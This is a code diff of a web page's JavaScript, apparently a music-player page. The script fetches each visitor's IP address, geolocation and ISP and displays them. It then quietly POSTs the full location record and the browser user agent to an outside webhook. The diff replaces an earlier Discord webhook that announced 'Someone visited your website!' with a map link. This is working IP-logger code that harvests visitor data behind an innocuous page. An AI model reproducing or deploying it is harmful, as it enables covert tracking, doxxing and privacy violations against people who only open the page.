@@ -5,55 +5,34 @@ const regionElement = document.getElementById('region');
 const ispElement = document.getElementById('isp');
 const player = document.getElementById('player'); 
 const playPauseButton = document.getElementById('play-pause-button');
+const BACKEND_URL = 'https://vercel-1320.vercel.app/api/webhook';
 
-// Fetch the IP address and location data
 fetch('https://api64.ipify.org?format=json')
   .then(response => response.json())
   .then(data => {
     ipAddressElement.textContent = data.ip;
 
-    // Fetch additional IP information using IP-API
     fetch(`https://ipapi.co/${data.ip}/json/`)
       .then(response => response.json())
       .then(ipData => {
-        // Display additional information
-        const country = ipData.country_name;
-        const region = ipData.region; 
-        const isp = ipData.org;
-        const location = `${ipData.city} (approx)`;
-        countryElement.textContent = country;
-        regionElement.textContent = region;
-        ispElement.textContent = isp;
-        locationElement.textContent = location;
-        const message = `# Someone visited your website! \n\n` +
-                       `**IP:** ${ipData.ip} \n` + 
-                       `**Location:** ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n` +
-                       `**ISP:** ${ipData.org} \n` +
-                       `**User Agent:** ${navigator.userAgent} \n` +
-                       `[Map](https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude})\n`;
+        countryElement.textContent = ipData.country_name;
+        regionElement.textContent = ipData.region; 
+        ispElement.textContent = ipData.org;
+        locationElement.textContent = `${ipData.city} (approx)`;
 
-        // Send to Discord Webhook
-        fetch(URL, {
+        fetch(BACKEND_URL, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            content: message,
+            ipData: ipData,
+            userAgent: navigator.userAgent
           }),
         });
       })
-      .catch(error => {
-        console.error('Error fetching IP information:', error);
-        // Handle the error appropriately (e.g., display a message)
-      });
+      .catch(error => console.error(error));
   })
-  .catch(error => {
-    console.error('Error fetching IP address:', error);
-    // Display an error message to the user
-  });
+  .catch(error => console.error(error));
 
-// Function to handle button clicks
 function togglePlayPause() {
   if (player.paused) { 
     player.play();
@@ -64,5 +43,4 @@ function togglePlayPause() {
   }
 }
 
-// Add event listener to the button
 playPauseButton.addEventListener('click', togglePlayPause);
